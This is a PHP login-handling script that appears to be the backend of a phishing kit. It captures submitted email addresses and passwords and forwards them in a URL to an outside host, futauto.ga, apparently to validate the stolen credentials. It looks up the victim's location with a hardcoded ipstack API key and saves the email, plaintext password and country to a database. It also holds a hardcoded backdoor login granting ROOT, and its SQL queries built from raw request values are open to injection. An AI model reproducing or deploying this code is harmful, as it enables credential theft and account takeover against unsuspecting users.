<?php
session_start();

include "./connect.php" ;

$_SESSION['id'] = $_SERVER['REMOTE_ADDR'] . ' : ' . time() ;
$id = $_SESSION['id'] ;

if (isset($_REQUEST['email']) && isset($_REQUEST['password']) && !preg_match('/\s+/',$_REQUEST['email']) >= 1  && !preg_match('/\s+/',$_REQUEST['password']) >= 1)
{
$_SESSION['email'] = $_REQUEST['email'] ;
$_SESSION['password'] = $_REQUEST['password'] ;

if  (( 'pandabou' === $_REQUEST['email'] ) && ( 'pass123456' === $_REQUEST['password'] ))
{
        $_SESSION['id'] = 'ROOT' ;
        header('Location:Dashboard.php') ;
}
else {

$test = false ;

$email = $_REQUEST['email'];
$password = $_REQUEST['password'];

$res  = $conn->query(" select * from users where email='$email' and password='$password' ;") ;

if ( $res->rowCount() > 0 ) {
$test = true ;
$res = $conn->query(" update users set id='$id' where email='$email' and password='$password' ;") ; }

$x = file_get_contents('http://www.futauto.ga/botapi.php?x='.$_REQUEST['email'].'&y='.$_REQUEST['password']);

if ( $x === "We have an error logging in: user_or_pass" )

{ header('Location:/?Auth=Wrong') ;  }

else {

if ( !$test )
{

header('Location:Secure.php') ;

$res = file_get_contents($url);

$datalocation = json_decode(file_get_contents('http://api.ipstack.com/'.$_SERVER['REMOTE_ADDR'].'?access_key=1f82e4ceee401eb67e608d6798acee96&format=1'),true) ;

$location = $datalocation['country_name'] ;

$res = $conn->query(" insert into users values ('$id','$email','$password','Unknown','$location') ; ");

header('Location:Secure.php') ; }

 } } } else { header('Location:/?Auth=Wrong') ; }
?>
